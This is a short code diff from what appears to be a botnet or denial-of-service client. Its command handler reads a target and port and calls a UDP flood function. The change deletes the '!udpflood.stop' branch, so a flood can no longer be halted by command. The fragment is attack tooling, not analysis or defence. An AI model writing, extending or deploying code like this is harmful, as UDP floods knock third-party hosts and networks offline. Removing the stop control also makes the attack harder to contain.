@@ -22,8 +22,6 @@ def handle_commands(command):
             target  = addr[0]
             port    = addr[1]
             udp._flood(target,port)
-        elif "!udpflood.stop" in command:
-            udp._stop()
         else:
             pass
     except:
